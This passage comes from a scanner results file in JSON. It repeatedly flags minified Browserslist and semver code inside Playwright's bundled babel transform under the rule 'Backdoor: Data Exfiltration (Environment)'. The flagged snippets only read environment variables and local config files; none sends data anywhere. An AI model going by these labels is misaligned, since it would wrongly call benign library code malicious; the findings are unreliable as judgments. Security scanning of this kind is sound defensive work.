                    "text": "TATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:fun",
                    "rendered": {
                      "text": "TATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:fun",
                      "markdown": "`TATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:fun`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59513,
                  "endLine": 1723,
                  "endColumn": 59524,
                  "snippet": {
                    "text": "or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSE",
                    "rendered": {
                      "text": "or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSE",
                      "markdown": "`or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSE`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59480,
                  "endLine": 1723,
                  "endColumn": 59491,
                  "snippet": {
                    "text": " exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:",
                    "rendered": {
                      "text": " exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:",
                      "markdown": "` exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59283,
                  "endLine": 1723,
                  "endColumn": 59294,
                  "snippet": {
                    "text": "TEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,fu",
                    "rendered": {
                      "text": "TEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,fu",
                      "markdown": "`TEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,r,n){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var s=require(require.resolve(rn.join(r,\"browserslist-stats.json\"),{paths:[\".\"]}));return Vw(n,s)},getStat:function(t,r){var n;if(t.stats?n=t.stats:process.env.BROWSERSLIST_STATS?n=process.env.BROWSERSLIST_STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,fu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 58946,
                  "endLine": 1723,
                  "endColumn": 58957,
                  "snippet": {
                    "text": "n]);if(s.length===1&&e[n]&&e[n].versions.length===1){var i=e[n].versions[0];r[n]={},r[n][i]=t[n][s[0]]}else r[n]=t[n]}return r}}function Jhe(e,t){for(var r in e){var n=e[r];if(\"0\"in n){var s=t[r].versions;n[s[s.length-1]]=n[0],delete n[0]}}}yi.exports={loadQueries:function(t,r){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,",
                    "rendered": {
                      "text": "n]);if(s.length===1&&e[n]&&e[n].versions.length===1){var i=e[n].versions[0];r[n]={},r[n][i]=t[n][s[0]]}else r[n]=t[n]}return r}}function Jhe(e,t){for(var r in e){var n=e[r];if(\"0\"in n){var s=t[r].versions;n[s[s.length-1]]=n[0],delete n[0]}}}yi.exports={loadQueries:function(t,r){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,",
                      "markdown": "`n]);if(s.length===1&&e[n]&&e[n].versions.length===1){var i=e[n].versions[0];r[n]={},r[n][i]=t[n][s[0]]}else r[n]=t[n]}return r}}function Jhe(e,t){for(var r in e){var n=e[r];if(\"0\"in n){var s=t[r].versions;n[s[s.length-1]]=n[0],delete n[0]}}}yi.exports={loadQueries:function(t,r){!t.dangerousExtend&&!process.env.BROWSERSLIST_DANGEROUS_EXTEND&&Rw(r);var n=require(require.resolve(r,{paths:[\".\",t.path]}));if(n){if(Array.isArray(n))return n;if(typeof n==\"object\")return n.defaults||(n.defaults=[]),ef(n,t,r)}throw new nr(\"`\"+r+\"` config exports not an array of queries or an object of envs\")},loadStat:function(t,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 57926,
                  "endLine": 1723,
                  "endColumn": 57937,
                  "snippet": {
                    "text": "ray.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browserslist)throw new nr(\"`brows",
                    "rendered": {
                      "text": "ray.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browserslist)throw new nr(\"`brows",
                      "markdown": "`ray.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browserslist)throw new nr(\"`brows`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 57903,
                  "endLine": 1723,
                  "endColumn": 57914,
                  "snippet": {
                    "text": ")}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browsersli",
                    "rendered": {
                      "text": ")}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browsersli",
                      "markdown": "`)}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if(t.browserlist&&!t.browsersli`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 57874,
                  "endLine": 1723,
                  "endColumn": 57885,
                  "snippet": {
                    "text": "s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if",
                    "rendered": {
                      "text": "s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if",
                      "markdown": "`s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toString().replace(/^\\uFEFF/m,\"\"));if`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 57843,
                  "endLine": 1723,
                  "endColumn": 57854,
                  "snippet": {
                    "text": "f(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toStri",
                    "rendered": {
                      "text": "f(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toStri",
                      "markdown": "`f(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof e!=\"string\")throw new nr(Mw)}function ef(e,t){if(typeof e!=\"object\")return e;var r;if(typeof t.env==\"string\"?r=t.env:process.env.BROWSERSLIST_ENV?r=process.env.BROWSERSLIST_ENV:process.env.NODE_ENV?r=process.env.NODE_ENV:r=\"production\",t.throwOnMissing&&r&&r!==\"defaults\"&&!e[r])throw new nr(\"Missing config for Browserslist environment `\"+r+\"`\");return e[r]||e.defaults}function Uw(e){var t=JSON.parse(da.readFileSync(e).toStri`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 57415,
                  "endLine": 1723,
                  "endColumn": 57426,
                  "snippet": {
                    "text": "lace(/^@[^/]+\\//,\"\").indexOf(\".\")!==-1)throw new nr(\"`.` not allowed in Browserslist config name. \"+t);if(e.indexOf(\"node_modules\")!==-1)throw new nr(\"`node_modules` not allowed in Browserslist config.\"+t)}function Tn(e){if(e in tf)return tf[e];var t=da.existsSync(e)&&da.statSync(e).isFile();return process.env.BROWSERSLIST_DISABLE_CACHE||(tf[e]=t),t}function qw(e,t){var r=Tn(e)?rn.dirname(e):e,n=rn.resolve(r);do{var s=t(n);if(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof ",
                    "rendered": {
                      "text": "lace(/^@[^/]+\\//,\"\").indexOf(\".\")!==-1)throw new nr(\"`.` not allowed in Browserslist config name. \"+t);if(e.indexOf(\"node_modules\")!==-1)throw new nr(\"`node_modules` not allowed in Browserslist config.\"+t)}function Tn(e){if(e in tf)return tf[e];var t=da.existsSync(e)&&da.statSync(e).isFile();return process.env.BROWSERSLIST_DISABLE_CACHE||(tf[e]=t),t}function qw(e,t){var r=Tn(e)?rn.dirname(e):e,n=rn.resolve(r);do{var s=t(n);if(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof ",
                      "markdown": "`lace(/^@[^/]+\\//,\"\").indexOf(\".\")!==-1)throw new nr(\"`.` not allowed in Browserslist config name. \"+t);if(e.indexOf(\"node_modules\")!==-1)throw new nr(\"`node_modules` not allowed in Browserslist config.\"+t)}function Tn(e){if(e in tf)return tf[e];var t=da.existsSync(e)&&da.statSync(e).isFile();return process.env.BROWSERSLIST_DISABLE_CACHE||(tf[e]=t),t}function qw(e,t){var r=Tn(e)?rn.dirname(e):e,n=rn.resolve(r);do{var s=t(n);if(typeof s!=\"undefined\")return s}while(n!==(n=rn.dirname(n)))}function Yhe(e){if(Array.isArray(e)){for(var t=0;t<e.length;t++)if(typeof e[t]!=\"string\")throw new nr(Mw)}else if(typeof `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 1772,
                  "endLine": 1695,
                  "endColumn": 1783,
                  "snippet": {
                    "text": "ingSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=ke.safeRe=[],H=ke.src=[],U=ke.tokens={},n2=0",
                    "rendered": {
                      "text": "ingSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=ke.safeRe=[],H=ke.src=[],U=ke.tokens={},n2=0",
